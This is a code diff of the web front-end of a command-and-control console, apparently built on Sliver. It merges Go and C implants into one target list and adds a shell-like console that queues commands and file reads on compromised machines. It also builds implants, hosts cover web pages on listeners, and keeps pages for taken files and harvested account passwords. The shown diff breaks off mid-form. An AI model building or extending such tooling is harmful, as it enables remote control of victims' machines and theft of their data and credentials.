@@ -1,13 +1,11 @@
 const pages = [
   ["dashboard", "首页"],
-  ["implants", "已上线"],
-  ["commands", "服务器命令"],
+  ["implants", "目标"],
   ["payloads", "植入体"],
   ["listeners", "监听端口"],
-  ["lite", "轻量信标"],
-  ["loot", "拿走的文件"],
-  ["creds", "账号密码"],
-  ["hosts", "见过的机器"],
+  ["loot", "文件"],
+  ["creds", "账密"],
+  ["hosts", "历史机器"],
   ["websites", "托管网页"],
   ["config", "系统资料"],
   ["operators", "登录账号"],
@@ -69,6 +67,15 @@ const state = {
   tab: "command",
   cwd: ".",
   action: "execute",
+  implantKind: null,
+  liteSelected: null,
+  liteBeacons: [],
+  aliases: {},
+  targetNote: "",
+  aliasEditing: false,
+  liteEntries: {},
+  liteHist: {},
+  liteHistIdx: {},
 };
 
 const $ = (id) => document.getElementById(id);
@@ -141,6 +148,10 @@ async function boot() {
     if (!button) return;
     state.page = button.dataset.page;
     state.selected = null;
+    state.liteSelected = null;
+    state.implantKind = null;
+    state.targetNote = "";
+    state.aliasEditing = false;
     render();
   };
   $("refresh").onclick = () => render();
@@ -182,6 +193,7 @@ function showLogin() {
   $("login").classList.remove("hidden");
   $("shell").classList.add("hidden");
   clearInterval(state.timer);
+  stopLiteTimers();
 }
 
 function showApp() {
@@ -190,16 +202,18 @@ function showApp() {
   render();
   clearInterval(state.timer);
   state.timer = setInterval(() => {
-    if (state.page === "dashboard" || state.page === "implants") refreshImplants(false);
+    if (state.page === "dashboard") refreshImplants(false);
+    if (state.page === "implants" && !state.selected && !state.liteSelected && !state.aliasEditing) render();
   }, 5000);
 }
 
 async function render() {
+  stopLiteTimers();
   document.querySelectorAll("#nav button").forEach((button) => {
     button.classList.toggle("active", button.dataset.page === state.page);
   });
   const meta = pages.find((item) => item[0] === state.page);
-  $("title").textContent = state.selected ? state.selected.Name || state.selected.ID : meta[1];
+  $("title").textContent = state.selected ? targetLabel(state.selected) : meta[1];
   $("subtitle").textContent = state.selected ? `${kindLabel(state.selected.kind)} · ${state.selected.Hostname || ""}` : "这个页面只在你自己的电脑上打开";
   $("clock").textContent = new Date().toLocaleTimeString();
   const view = $("view");
@@ -207,10 +221,8 @@ async function render() {
   try {
     if (state.page === "dashboard") await renderDashboard(view);
     else if (state.page === "implants") await renderImplants(view);
-    else if (state.page === "commands") renderCommandBrowser(view, "server", null);
     else if (state.page === "payloads") await renderPayloads(view);
     else if (state.page === "listeners") await renderListeners(view);
-    else if (state.page === "lite") await renderLite(view);
     else if (state.page === "loot") await renderLoot(view);
     else if (state.page === "creds") await renderCreds(view);
     else if (state.page === "hosts") await renderHosts(view);
@@ -230,6 +242,7 @@ async function refreshImplants(redraw) {
     const pool = state.selected.kind === "beacon" ? state.beacons : state.sessions;
     const fresh = pool.find((item) => item.ID === state.selected.ID);
     if (fresh) state.selected = Object.assign(fresh, { kind: state.selected.kind });
+    else state.selected = null;
   }
   if (redraw) render();
 }
@@ -241,10 +254,10 @@ async function renderDashboard(view) {
       ${card("一直连着", data.sessionsAlive, `共 ${data.sessions} 台`)}
       ${card("定时回来", data.beaconsAlive, `共 ${data.beacons} 台`)}
       ${card("监听端口", data.jobs, "正在等机器连上来")}
-      ${card("当前时间", new Date(data.time * 1000).toLocaleTimeString(), "已上线列表每 5 秒刷新")}
+      ${card("当前时间", new Date(data.time * 1000).toLocaleTimeString(), "目标列表每 5 秒刷新")}
     </div>
     <section class="panel"><h3>从这里开始</h3>
-      <p class="hint">「已上线」是已经连回来的机器。「植入体」是编译出来、还没运行的文件。「监听端口」是这些机器要连的地址。「服务器命令」可以操作这个控制台本身。点进一台已上线的机器后，可以下命令、看文件，远程命令行在「终端」页。</p>
+      <p class="hint">「目标」统一管理已经连回来的机器，Go 和 C 都在这张表里。点进去再操作。「植入体」里选择类型后当场编译。「监听端口」里的 HTTPS 同时接待 Go 和 C，靠路径分开。</p>
     </section>`;
 }
 
@@ -253,19 +266,157 @@ function card(label, value, note) {
 }
 
 async function renderImplants(view) {
+  const [lite, aliasBook] = await Promise.all([
+    api("/api/lite/beacons"),
+    api("/api/targets/aliases"),
+    refreshImplants(false),
+  ]);
+  state.liteBeacons = lite.Beacons || [];
+  state.aliases = aliasBook.aliases || {};
+  if (state.liteSelected && !liteBeacon(state.liteSelected)) state.liteSelected = null;
+  if (state.selected) $("title").textContent = targetLabel(state.selected);
+  if (state.liteSelected) return renderLiteConsole(view);
   if (state.selected) return renderInteract(view);
-  await refreshImplants(false);
   const rows = [];
   for (const item of state.sessions) rows.push(implantRow(item, "session"));
   for (const item of state.beacons) rows.push(implantRow(item, "beacon"));
-  view.innerHTML = table(["状态", "怎么连", "名称", "机器名", "用户", "连接方式", "地址", "进程", "最近联系"], rows);
+  for (const item of state.liteBeacons) rows.push(liteRow(item));
+  view.innerHTML = `<section class="panel targets"><h3>目标</h3>
+    <p class="hint">点一行进入这台机器。点别名可以直接改，留空就恢复成机器名。在线是绿色，离线是红色。</p>
+    <p id="target-note" class="hint">${esc(state.targetNote)}</p>
+    ${table(["状态", "别名", "植入体", "怎么连", "机器名", "用户", "系统", "地址", "最近联系", "操作"], rows)}</section>`;
   view.querySelectorAll("tr.clickable").forEach((row) => {
-    row.onclick = () => {
+    row.onclick = (event) => {
+      if (event.target.closest("button, .alias, input")) return;
       const kind = row.dataset.kind;
-      const pool = kind === "beacon" ? state.beacons : state.sessions;
-      state.selected = Object.assign({}, pool.find((item) => item.ID === row.dataset.id), { kind });
-      state.cwd = ".";
+      if (kind === "lite") {
+        state.selected = null;
+        state.liteSelected = row.dataset.id;
+      } else {
+        state.liteSelected = null;
+        const pool = kind === "beacon" ? state.beacons : state.sessions;
+        state.selected = Object.assign({}, pool.find((item) => item.ID === row.dataset.id), { kind });
+        state.cwd = ".";
+      }
       render();
+    };
+  });
+  bindTargetActions(view);
+  bindAliasEditors(view);
+}
+
+function machineName(item) {
+  if (!item) return "";
+  const info = item.Info || {};
+  return item.Hostname || info.Hostname || "";
+}
+
+function shownAlias(id, hostname) {
+  return state.aliases[id] || hostname || "未知机器";
+}
+
+function targetLabel(item) {
+  if (!item) return "";
+  return shownAlias(item.ID, machineName(item));
+}
+
+function aliasView(tag, kind, id, hostname) {
+  return `<${tag} class="alias" data-kind="${esc(kind)}" data-id="${esc(id)}" data-host="${esc(hostname || "")}" title="点击修改别名">${esc(shownAlias(id, hostname))}</${tag}>`;
+}
+
+function targetActions(kind, id) {
+  const button = (act, label, danger) => `<button type="button" class="small${danger ? " danger" : ""}" data-act="${act}" data-kind="${esc(kind)}" data-id="${esc(id)}">${label}</button>`;
+  return `<span class="row-actions">${button("remove", "删除", true)}${button("stop", "结束", true)}</span>`;
+}
+
+function bindAliasEditors(root) {
+  root.querySelectorAll(".alias").forEach((cell) => {
+    cell.onmousedown = (event) => {
+      if (cell.querySelector("input")) return;
+      event.preventDefault();
+      event.stopPropagation();
+    };
+    cell.onclick = (event) => {
+      event.preventDefault();
+      event.stopPropagation();
+      if (cell.querySelector("input")) return;
+      const current = shownAlias(cell.dataset.id, cell.dataset.host);
+      state.aliasEditing = true;
+      cell.innerHTML = `<input value="${esc(current)}" maxlength="32" aria-label="别名">`;
+      const input = cell.querySelector("input");
+      input.focus();
+      input.select();
+      let closed = false;
+      const finish = async (save) => {
+        if (closed) return;
+        closed = true;
+        const next = input.value.trim();
+        const host = cell.dataset.host || "";
+        if (!save || next === current) {
+          cell.textContent = current;
+          state.aliasEditing = false;
+          return;
+        }
+        try {
+          const saved = await api("/api/targets/rename", { method: "POST", json: { kind: cell.dataset.kind, id: cell.dataset.id, name: next === host ? "" : next } });
+          if (!saved.name || saved.name === host) delete state.aliases[cell.dataset.id];
+          else state.aliases[cell.dataset.id] = saved.name;
+          const label = shownAlias(cell.dataset.id, host);
+          cell.textContent = label;
+          if ($("title") && (state.selected || state.liteSelected)) $("title").textContent = label;
+          state.targetNote = saved.name ? "别名已改成 " + saved.name : "别名已恢复成机器名";
+        } catch (err) {
+          cell.textContent = current;
+          state.targetNote = err.message;
+        }
+        const note = $("target-note");
+        if (note) note.textContent = state.targetNote;
+        state.aliasEditing = false;
+      };
+      input.onclick = (event) => event.stopPropagation();
+      input.onkeydown = (event) => {
+        event.stopPropagation();
+        if (event.key === "Enter") {
+          event.preventDefault();
+          finish(true);
+        } else if (event.key === "Escape") {
+          event.preventDefault();
+          finish(false);
+        }
+      };
+      input.onblur = () => finish(true);
+    };
+  });
+}
+
+function bindTargetActions(root) {
+  root.querySelectorAll("[data-act]").forEach((button) => {
+    button.onclick = async (event) => {
+      event.preventDefault();
+      event.stopPropagation();
+      const kind = button.dataset.kind;
+      const id = button.dataset.id;
+      try {
+        if (button.dataset.act === "remove") {
+          if (!confirm("从列表拿掉这台机器。程序如果还在，下次再发信号会重新出现在列表里。")) return;
+          await api("/api/targets/remove", { method: "POST", json: { kind, id } });
+          delete state.aliases[id];
+          if (state.selected && state.selected.ID === id) state.selected = null;
+          if (state.liteSelected === id) state.liteSelected = null;
+          state.targetNote = "已从列表删除";
+        } else if (button.dataset.act === "stop") {
+          if (!confirm("结束会让对面的程序退出。定时回来的机器要等下次连上才会真正退出，退出后可以再点删除。")) return;
+          await api("/api/targets/stop", { method: "POST", json: { kind, id } });
+          if (kind === "session" && state.selected && state.selected.ID === id) state.selected = null;
+          state.targetNote = kind === "session" ? "已让这台机器退出" : "退出命令已记下，等它下次连上";
+        }
+        render();
+      } catch (err) {
+        state.targetNote = err.message;
+        const note = $("target-note");
+        if (note) note.textContent = err.message;
+        else render();
+      }
     };
   });
 }
@@ -276,9 +427,31 @@ function kindLabel(kind) {
 
 function implantRow(item, kind) {
   return `<tr class="clickable" data-kind="${kind}" data-id="${esc(item.ID)}">
-    <td>${pill(item.IsDead)}</td><td>${kindLabel(kind)}</td><td>${esc(item.Name)}</td><td>${esc(item.Hostname)}</td>
-    <td>${esc(item.Username)}</td><td>${esc(item.Transport)}</td><td>${esc(item.RemoteAddress)}</td>
-    <td>${esc(item.Filename)} (${esc(item.PID)})</td><td>${when(item.LastCheckin)}</td></tr>`;
+    <td>${pill(item.IsDead)}</td>${aliasView("td", kind, item.ID, item.Hostname)}<td>Go</td><td>${kindLabel(kind)}</td><td class="clip" title="${esc(item.Hostname)}">${esc(item.Hostname)}</td>
+    <td>${esc(item.Username)}</td><td class="clip" title="${esc(item.OS)}/${esc(item.Arch)}">${esc(item.OS)}/${esc(item.Arch)}</td><td>${esc(item.RemoteAddress || "—")}</td><td>${when(item.LastCheckin)}</td>
+    <td class="actions">${targetActions(kind, item.ID)}</td></tr>`;
+}
+
+function liteRow(item) {
+  const info = item.Info || {};
+  const stale = liteLost(item);
+  return `<tr class="clickable" data-kind="lite" data-id="${esc(item.ID)}">
+    <td>${pill(stale)}</td>${aliasView("td", "lite", item.ID, info.Hostname || "")}<td>C</td><td>定时回来</td><td class="clip" title="${esc(info.Hostname || "")}">${esc(info.Hostname || "")}</td>
+    <td>${esc(info.Username || "")}</td><td class="clip" title="${esc(info.OS || "")}/${esc(info.Arch || "")}">${esc(info.OS || "")}/${esc(info.Arch || "")}</td><td>—</td><td>${esc(liteAgo(item.LastSeen))}</td>
+    <td class="actions">${targetActions("lite", item.ID)}</td></tr>`;
+}
+
+function liteAgeSec(iso) {
+  if (!iso) return Infinity;
+  const ms = Date.now() - new Date(iso).getTime();
+  if (isNaN(ms)) return Infinity;
+  return Math.max(0, Math.round(ms / 1000));
+}
+
+function liteLost(item) {
+  const interval = Math.max(5, Number(item && item.IntervalSec) || 10);
+  // 空闲时实际睡眠是间隔的 0.5~3 倍；干活时按间隔整秒。超过 4 倍才算失联。
+  return liteAgeSec(item && item.LastSeen) > interval * 4;
 }
 
 async function renderInteract(view) {
@@ -286,9 +459,11 @@ async function renderInteract(view) {
   view.innerHTML = `
     <div class="row" style="margin-bottom:12px">
       <button class="ghost" id="back">返回列表</button>
-      <span class="hint">${esc(item.Username)}@${esc(item.Hostname)} · ${esc(item.OS)}/${esc(item.Arch)} · ${esc(item.ActiveC2 || item.Transport)} · PID ${esc(item.PID)}</span>
+      <span class="hint">${aliasView("span", item.kind, item.ID, item.Hostname)} · ${esc(item.Username)}@${esc(item.Hostname)} · ${esc(item.OS)}/${esc(item.Arch)} · ${esc(item.ActiveC2 || item.Transport)} · PID ${esc(item.PID)}</span>
       ${pill(item.IsDead)}
+      ${targetActions(item.kind, item.ID)}
     </div>
+    <p id="target-note" class="hint">${esc(state.targetNote)}</p>
     <div class="tabs" id="tabs">
       <button data-tab="command" class="${state.tab === "command" ? "active" : ""}">全部命令</button>
       <button data-tab="terminal" class="${state.tab === "terminal" ? "active" : ""}">终端</button>
@@ -296,7 +471,9 @@ async function renderInteract(view) {
       <button data-tab="tasks" class="${state.tab === "tasks" ? "active" : ""}">任务</button>
     </div>
     <div id="interact"></div>`;
-  $("back").onclick = () => { state.selected = null; render(); };
+  $("back").onclick = () => { state.selected = null; state.targetNote = ""; render(); };
+  bindTargetActions(view);
+  bindAliasEditors(view);
   view.querySelectorAll("#tabs button").forEach((button) => {
     button.onclick = () => { state.tab = button.dataset.tab; render(); };
   });
@@ -405,7 +582,24 @@ async function renderTasks(box) {
   box.innerHTML = table(["状态", "描述", "创建", "完成", "ID"], tasks.map((task) => `<tr><td>${esc(task.State)}</td><td>${esc(task.Description)}</td><td>${when(task.CreatedAt)}</td><td>${when(task.CompletedAt)}</td><td class="mono">${esc(task.ID)}</td></tr>`));
 }
 
+const implantCatalog = [
+  ["go", "Go", "功能完整。支持命令、文件、实时终端。在这台电脑上编译，体积较大。"],
+  ["c", "C", "只做回连、执行命令和读文件。在这里选好参数后当场编译，体积小。"],
+];
+
 async function renderPayloads(view) {
+  if (state.implantKind === "c") return renderCImplant(view);
+  if (state.implantKind === "go") return renderGoImplant(view);
+  const rows = implantCatalog.map(([id, name, note]) => `<tr class="clickable" data-kind="${id}"><td>${esc(name)}</td><td>${esc(note)}</td><td>生成</td></tr>`);
+  view.innerHTML = `<section class="panel"><h3>植入体</h3>
+    <p class="hint">先选一种植入体，再生成。已经连回来的机器都在「目标」里管理。</p>
+    ${table(["植入体", "说明", ""], rows)}</section>`;
+  view.querySelectorAll("tr.clickable").forEach((row) => {
+    row.onclick = () => { state.implantKind = row.dataset.kind; render(); };
+  });
+}
+
+async function renderGoImplant(view) {
   const builds = await api("/api/implants/builds");
   const configs = builds.Configs || {};
   const rows = Object.keys(configs).map((name) => {
@@ -414,7 +608,8 @@ async function renderPayloads(view) {
     return `<tr><td>${esc(name)}</td><td>${cfg.IsBeacon ? "定时回来" : "一直连着"}</td><td>${esc(cfg.GOOS)}/${esc(cfg.GOARCH)}</td><td>${esc(c2)}</td><td><button class="small" data-rebuild="${esc(name)}">下载</button> <button class="small danger" data-del="${esc(name)}">删除</button></td></tr>`;
   });
   view.innerHTML = `
-    <form id="gen" class="panel"><h3>生成植入体</h3>
+    <div class="lite-actions"><button type="button" class="ghost" id="implant-back">返回列表</button></div>
+    <form id="gen" class="panel"><h3>生成 Go 植入体</h3>
       <div class="row">
         <label>名称<input name="name" placeholder="留空会自动起名"></label>
         <label>系统<select name="os"><option>linux</option><option>windows</option><option>darwin</option></select></label>
@@ -436,6 +631,7 @@ async function renderPayloads(view) {
     <section class="panel"><h3>已经生成过的植入体</h3>
       <p id="builds-note" class="hint">点「下载」会把文件存进浏览器的下载目录。点「删除」会从这台电脑上删掉这份文件和记录。</p>
       ${table(["名称", "上线方式", "要跑在哪", "回连地址", "操作"], rows)}</section>`;
+  $("implant-back").onclick = () => { state.implantKind = null; render(); };
   $("gen").onsubmit = async (event) => {
     event.preventDefault();
     const form = new FormData(event.target);
@@ -488,8 +684,9 @@ async function removeBuild(name) {
 }
 
 async function renderListeners(view) {
-  const jobs = await api("/api/jobs");
+  const [jobs, sites] = await Promise.all([api("/api/jobs"), api("/api/websites")]);
   const rows = (jobs.Active || []).map((job) => `<tr><td>${esc(job.ID)}</td><td>${esc(job.Name)}</td><td>${esc(job.Protocol)}</td><td>${esc(job.Port)}</td><td>${esc(job.Description)}</td><td><button class="small danger" data-job="${esc(job.ID)}">停止</button></td></tr>`);
+  const siteOptions = (sites.Websites || []).map((site) => `<option value="${esc(site.Name)}">${esc(site.Name)}</option>`).join("");
   view.innerHTML = `
     <form id="listen" class="panel"><h3>打开一个监听端口</h3>
       <div class="row">
@@ -497,15 +694,17 @@ async function renderListeners(view) {
         <label>监听地址<input name="host" value="127.0.0.1"></label>
         <label>端口<input name="port" value="8888"></label>
         <label>域名<input name="domain" placeholder="网页用的域名，或域名监听的上级域名"></label>
+        <label>托管的网页<select name="website"><option value="">不挂网页</option>${siteOptions}</select></label>
       </div>
-      <button type="submit">启动</button><p id="listen-note" class="hint"></p>
+      <button type="submit">启动</button>
+      <p id="listen-note" class="hint">只有 HTTP 和 HTTPS 会使用「托管的网页」。mTLS 和 DNS 会忽略这一项。</p>
     </form>
     <section class="panel"><h3>正在运行</h3>${table(["ID", "名称", "协议", "端口", "说明", ""], rows)}</section>`;
   $("listen").onsubmit = async (event) => {
     event.preventDefault();
     const form = new FormData(event.target);
     try {
-      await api("/api/listeners/" + form.get("proto"), { method: "POST", json: { host: form.get("host"), port: Number(form.get("port")), domain: form.get("domain") } });
+      await api("/api/listeners/" + form.get("proto"), { method: "POST", json: { host: form.get("host"), port: Number(form.get("port")), domain: form.get("domain"), website: form.get("website") } });
       render();
     } catch (err) {
       $("listen-note").textContent = err.message;
@@ -520,7 +719,7 @@ async function renderListeners(view) {
 async function renderLoot(view) {
   const data = await api("/api/loot");
   const rows = (data.Loot || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${esc(item.FileType)}</td><td>${esc(item.Size)}</td><td>${esc(item.OriginHostUUID)}</td><td><a href="/api/loot/content?id=${encodeURIComponent(item.ID)}&token=${encodeURIComponent(state.token)}">下载</a> <button class="small danger" data-id="${esc(item.ID)}">删除</button></td></tr>`);
-  view.innerHTML = `<section class="panel"><h3>已经拿走的文件</h3>${table(["名称", "类型", "大小", "来自哪台机器", ""], rows)}</section>`;
+  view.innerHTML = `<section class="panel"><h3>文件</h3>${table(["名称", "类型", "大小", "来自哪台机器", ""], rows)}</section>`;
   view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
     await api("/api/loot/delete", { method: "POST", json: { id: button.dataset.id } });
     render();
@@ -551,7 +750,7 @@ async function renderCreds(view) {
 async function renderHosts(view) {
   const data = await api("/api/hosts");
   const rows = (data.Hosts || []).map((item) => `<tr><td>${esc(item.Hostname)}</td><td>${esc(item.OSVersion)}</td><td class="mono">${esc(item.HostUUID)}</td><td><button class="small danger" data-id="${esc(item.HostUUID)}">删除</button></td></tr>`);
-  view.innerHTML = `<section class="panel"><h3>见过的机器</h3>${table(["机器名", "系统", "唯一编号", ""], rows)}</section>`;
+  view.innerHTML = `<section class="panel"><h3>历史机器</h3>${table(["机器名", "系统", "唯一编号", ""], rows)}</section>`;
   view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
     await api("/api/hosts/delete", { method: "POST", json: { hostUUID: button.dataset.id } });
     render();
@@ -560,13 +759,51 @@ async function renderHosts(view) {
 
 async function renderWebsites(view) {
   const data = await api("/api/websites");
-  const rows = (data.Websites || []).map((site) => {
+  const rows = [];
+  for (const site of data.Websites || []) {
     const paths = Object.keys(site.Contents || {});
-    return `<tr><td>${esc(site.Name)}</td><td>${paths.length}</td><td class="mono">${esc(paths.join(", "))}</td><td><button class="small danger" data-name="${esc(site.Name)}">删除</button></td></tr>`;
-  });
-  view.innerHTML = `<section class="panel"><h3>正在托管的网页</h3>${table(["名称", "文件数", "路径", ""], rows)}</section>`;
+    if (!paths.length) {
+      rows.push(`<tr><td>${esc(site.Name)}</td><td class="mono">/</td><td>还没有文件</td><td><button class="small danger" data-name="${esc(site.Name)}">删除整站</button></td></tr>`);
+      continue;
+    }
+    paths.forEach((item, index) => {
+      rows.push(`<tr><td>${index === 0 ? esc(site.Name) : ""}</td><td class="mono">${esc(item)}</td><td>${esc((site.Contents[item] || {}).ContentType || "")}</td><td><button class="small danger" data-site="${esc(site.Name)}" data-path="${esc(item)}">删除这一页</button>${index === 0 ? ` <button class="small danger" data-name="${esc(site.Name)}">删除整站</button>` : ""}</td></tr>`);
+    });
+  }
+  view.innerHTML = `
+    <form id="site-add" class="panel"><h3>放上一个页面</h3>
+      <div class="row">
+        <label>网站名称<input name="name" placeholder="例如 cover" required></label>
+        <label>访问路径<input name="path" value="/" placeholder="/ 或 /about"></label>
+        <label>文件<input name="file" type="file" required></label>
+      </div>
+      <button type="submit">放到这个路径</button>
+      <p id="site-note" class="hint">同一个网站名称可以放多个路径。同一路径再次上传会覆盖。要让别人打开它，到「监听端口」开 HTTP 或 HTTPS，并选这个网站名称。</p>
+    </form>
+    <section class="panel"><h3>正在托管的网页</h3>${table(["网站", "访问路径", "类型", ""], rows)}</section>`;
+  $("site-add").onsubmit = async (event) => {
+    event.preventDefault();
+    const form = new FormData(event.target);
+    const note = $("site-note");
+    note.textContent = "正在保存…";
+    try {
+      const res = await fetch("/api/websites/content", { method: "POST", headers: { Authorization: "Bearer " + state.token }, body: form });
+      const type = res.headers.get("content-type") || "";
+      const payload = type.includes("json") ? await res.json() : null;
+      if (!res.ok) throw new Error((payload && payload.error) || "保存失败");
+      note.textContent = "已放到 " + (form.get("path") || "/");
+      render();
+    } catch (err) {
+      note.textContent = err.message;
+    }
+  };
   view.querySelectorAll("[data-name]").forEach((button) => button.onclick = async () => {
     await api("/api/websites/delete", { method: "POST", json: { name: button.dataset.name } });
+    render();
+  });
+  view.querySelectorAll("[data-path]").forEach((button) => button.onclick = async (event) => {
+    event.stopPropagation();
+    await api("/api/websites/content/delete", { method: "POST", json: { name: button.dataset.site, path: button.dataset.path } });
     render();
   });
 }
@@ -593,57 +830,257 @@ async function renderOperators(view) {
   view.innerHTML = `<section class="panel"><h3>可以登录的账号</h3>${table(["名称", "状态"], rows)}</section>`;
 }
 
-async function renderLite(view) {
-  const [cfg, beacons] = await Promise.all([api("/api/lite/config"), api("/api/lite/beacons")]);
-  const rows = (beacons.Beacons || []).map((b) => {
-    const info = b.Info || {};
-    return `<tr><td class="mono">${esc(b.ID)}</td><td>${esc(info.Hostname || "")}</td><td>${esc(info.OS || "")}/${esc(info.Arch || "")}</td>
-      <td>${esc(info.Username || "")}</td><td>${whenISO(b.FirstSeen)}</td><td>${whenISO(b.LastSeen)}</td>
-      <td><button class="small danger" data-del="${esc(b.ID)}">删除</button></td></tr>`;
+function stopLiteTimers() {
+  clearInterval(state.liteClock);
+  clearInterval(state.litePoll);
+  state.liteClock = null;
+  state.litePoll = null;
+}
+
+function liteBeacon(id) {
+  return (state.liteBeacons || []).find((item) => item.ID === id);
+}
+
+function liteEnsure(id) {
+  if (!state.liteEntries[id]) state.liteEntries[id] = [];
+  if (!state.liteHist[id]) state.liteHist[id] = [];
+  if (state.liteHistIdx[id] == null) state.liteHistIdx[id] = 0;
+  return state.liteEntries[id];
+}
+
+function litePrompt(b) {
+  const info = (b && b.Info) || {};
+  return `${info.Username || "user"}@${info.Hostname || "host"} $ `;
+}
+
+function liteAgo(iso) {
+  if (!iso) return "从未";
+  const ms = Date.now() - new Date(iso).getTime();
+  if (isNaN(ms)) return "—";
+  const s = Math.max(0, Math.round(ms / 1000));
+  if (s < 3) return "刚刚";
+  if (s < 60) return s + "s 前";
+  if (s < 3600) return Math.floor(s / 60) + "m" + (s % 60) + "s 前";
+  return Math.floor(s / 3600) + "h 前";
+}
+
+function updateLiteHb() {
+  const el = $("lite-hb");
+  if (!el) return;
+  const b = liteBeacon(state.liteSelected);
+  if (!b) {
+    el.textContent = "";
+    return;
+  }
+  const interval = b.IntervalSec || 10;
+  const age = liteAgeSec(b.LastSeen);
+  const lost = liteLost(b);
+  const mode = lost ? "失联" : (b.Active ? "干活中" : "空闲");
+  let eta = `最近回连 ${age}s 前`;
+  let etaClass = "";
+  if (lost) {
+    eta = `已经 ${age}s 没有回连`;
+    etaClass = "late";
+  } else if (b.Active) {
+    eta = age <= interval ? `固定 ${interval}s，还剩约 ${interval - age}s` : `固定 ${interval}s，已过 ${age}s`;
+  } else if (age <= interval) {
+    eta = `按 ${interval}s 算还剩约 ${interval - age}s，空闲会在 0.5~3 倍之间浮动`;
+  } else {
+    eta = `这一轮已经 ${age}s，空闲最长约 ${interval * 3}s`;
+  }
+  const queued = b.Queued ? `排队 ${b.Queued}` : "队列空";
+  el.innerHTML = `<span class="${!lost && b.Active ? "fast" : ""} ${etaClass}">心跳 ${esc(interval)}s · ${mode}</span><span>最近 ${esc(liteAgo(b.LastSeen))}</span><span class="${etaClass}">${esc(eta)}</span><span>${esc(queued)}</span><span>平时 ${esc(b.IdleSec)}s / 干活 ${esc(b.FastSec)}s</span>`;
+  const waitText = lost ? "…失联，命令还在队列里" : `…等待回连（已 ${age}s）`;
+  const entries = state.liteEntries[state.liteSelected] || [];
+  let changed = false;
+  for (const item of entries) {
+    if (item.kind === "wait" && item.text !== waitText) {
+      item.text = waitText;
+      changed = true;
+    }
+  }
+  if (changed) paintLiteLog();
+}
+
+function paintLiteLog() {
+  const log = $("lite-log");
+  if (!log) return;
+  const entries = state.liteEntries[state.liteSelected] || [];
+  log.innerHTML = entries.map((item) => {
+    if (item.kind === "sys") return `<span class="lite-sys">${esc(item.text)}</span>`;
+    if (item.kind === "cmd") return `<span class="lite-prompt">${esc(item.prompt)}</span>${esc(item.text)}`;
+    if (item.kind === "wait") return `<span class="lite-wait">${esc(item.text)}</span>`;
+    if (item.kind === "err") return `<span class="lite-err">${esc(item.text)}</span>`;
+    return esc(item.text || "");
+  }).join("\n");
+  log.scrollTop = log.scrollHeight;
+}
+
+function formatLiteResult(result) {
+  if (result.Kind === "read") {
+    const errs = ["", "文件不存在", "没有权限", "文件太大"];
+    if (result.Err) return errs[result.Err] || ("读文件失败 " + result.Err);
+    return textOf(result.Output);
+  }
+  const out = textOf(result.Output);
+  if (result.Exit) return (out ? out.replace(/\s*$/, "") + "\n" : "") + `[exit ${result.Exit}]`;
+  return out.replace(/\s*$/, "");
+}
+
+function applyLiteResults(results) {
+  if (!results.length) return;
+  const entries = liteEnsure(state.liteSelected);
+  for (const result of results) {
+    const body = formatLiteResult(result);
+    const next = { kind: "out", taskId: result.TaskID, text: body };
+    const idx = entries.findIndex((item) => item.kind === "wait" && item.taskId === result.TaskID);
+    if (idx >= 0) entries[idx] = next;
+    else entries.push(next);
+  }
+  paintLiteLog();
+}
+
+async function pollLiteConsole() {
+  if (state.page !== "implants" || !state.liteSelected || !$("lite-input") || state.liteBusy) return;
+  state.liteBusy = true;
+  try {
+    const [beacons, data] = await Promise.all([
+      api("/api/lite/beacons"),
+      api("/api/lite/results?beacon=" + encodeURIComponent(state.liteSelected)),
+    ]);
+    state.liteBeacons = beacons.Beacons || [];
+    if (!liteBeacon(state.liteSelected)) {
+      state.liteSelected = null;
+      render();
+      return;
+    }
+    applyLiteResults(data.Results || []);
+    updateLiteHb();
+    const prompt = $("lite-prompt");
+    const b = liteBeacon(state.liteSelected);
+    if (prompt && b) prompt.textContent = litePrompt(b);
+  } catch (err) {
+    const hb = $("lite-hb");
+    if (hb) hb.textContent = "刷新失败：" + err.message;
+  } finally {
+    state.liteBusy = false;
+  }
+}
+
+function bindLiteShell(b) {
+  const input = $("lite-input");
+  const form = $("lite-shell");
+  if (!input || !form) return;
+  let ime = false;
+  input.addEventListener("compositionstart", () => { ime = true; });
+  input.addEventListener("compositionend", () => {
+    ime = true;
+    setTimeout(() => { ime = false; }, 0);
   });
-  view.innerHTML = `
-    <form id="lite-listen" class="panel"><h3>轻量信标监听</h3>
-      <p class="hint">C 植入体连这个独立端口，走轻量协议，和 Sliver 监听互不相干。${cfg.running ? "正在监听：" + esc(cfg.addr) : "当前没在监听。"}间隔策略：平时 ${cfg.idleSec} 秒 / 干活 ${cfg.fastSec} 秒（干活 = 5 分钟内排过任务或拉过结果，期间自动切快、停手 5 分钟后回落）。</p>
-      <div class="row">
-        <label>监听地址<input name="host" value="0.0.0.0"></label>
-        <label>端口<input name="port" value="8443"></label>
-        <label>路径<input name="path" value="/api/v2/sync"></label>
-        <label>目标看到的地址<input name="url" placeholder="https://c2.example.com:8443"></label>
-      </div>
-      <div class="row">
-        <label>平时回连秒数<input name="idleSec" value="10"></label>
-        <label>干活时回连秒数<input name="fastSec" value="10"></label>
-      </div>
-      <button type="submit">${cfg.running ? "重启监听" : "启动监听"}</button>
-      ${cfg.running ? '<button type="button" class="danger" id="lite-stop">停止</button>' : ""}
-      <p id="lite-note" class="hint"></p>
-    </form>
-    <section class="panel"><h3>构建配置</h3>
-      <p class="hint">把 config.h 存到 implant/lite/ 目录里，然后跑 ./build.sh linux 或 ./build.sh windows。当前密钥：${esc((cfg.secretB64 || "").slice(0, 12))}…（签发新密钥后，已部署的旧信标仍然有效）</p>
-      <button type="button" id="lite-cfg-dl">下载 config.h</button>
-      <button type="button" id="lite-cfg-new">签发新密钥</button>
-      <p id="lite-cfg-note" class="hint"></p>
-    </section>
-    <section class="panel"><h3>已上线的轻量信标</h3>${table(["ID", "机器名", "系统", "用户", "首次", "最近", ""], rows)}</section>
-    <form id="lite-task" class="panel"><h3>下发任务</h3>
-      <div class="row">
-        <label>信标 ID<input name="beaconId" placeholder="从上表复制"></label>
-        <label>类型<select name="type">
-          <option value="exec">执行命令</option><option value="read">读文件</option>
-          <option value="sleep">改回连间隔</option><option value="exit">让它退出</option>
-        </select></label>
-        <label>命令<input name="cmd" placeholder="id"></label>
-        <label>文件路径<input name="path" placeholder="/etc/hostname"></label>
-        <label>超时秒<input name="timeout" value="30"></label>
-        <label>新间隔秒<input name="interval" value="180"></label>
-      </div>
